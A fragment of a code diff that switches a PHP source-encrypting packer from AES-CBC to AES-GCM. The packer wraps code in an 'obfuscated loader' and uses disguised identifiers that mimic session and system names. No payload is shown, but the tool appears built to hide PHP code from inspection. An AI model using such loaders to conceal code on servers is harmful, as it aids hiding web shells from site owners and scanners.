@@ -11,10 +11,12 @@ $ghost_key      = 'PHPSSIDLOGINFODATARECOVESSRYSYSTEM';
 $ghost_val      = 'SYSTEM32LOGFILEINSTANCE';
 
 $code      = file_get_contents($source_file);
-$iv_len    = openssl_cipher_iv_length('aes-256-cbc');
+$method    = 'aes-256-gcm';
+$iv_len    = openssl_cipher_iv_length($method);
 $iv        = openssl_random_pseudo_bytes($iv_len);
-$encrypted = openssl_encrypt($code, 'aes-256-cbc', $encryption_key, 0, $iv);
-$payload   = base64_encode($iv . $encrypted);
+$tag       = "";
+$encrypted = openssl_encrypt($code, $method, $encryption_key, 0, $iv, $tag);
+$payload   = base64_encode($iv . $tag . $encrypted);
 
 // Obfuscated Loader Logic - compatible with PHP 5.6+
 $inner_loader = '
@@ -59,10 +61,12 @@ if (!$key) {
 }
 
 $raw = base64_decode($payload);
-$iv_l = openssl_cipher_iv_length("aes-256-cbc");
+$method = "aes-256-gcm";
+$iv_l = openssl_cipher_iv_length($method);
 $iv = substr($raw, 0, $iv_l);
-$cipher = substr($raw, $iv_l);
-$dec = openssl_decrypt($cipher, "aes-256-cbc", $key, 0, $iv);
+$tag = substr($raw, $iv_l, 16);
+$cipher = substr($raw, $iv_l + 16);
+$dec = openssl_decrypt($cipher, $method, $key, 0, $iv, $tag);
 
 if ($dec) {
     if (session_status() == PHP_SESSION_NONE) {
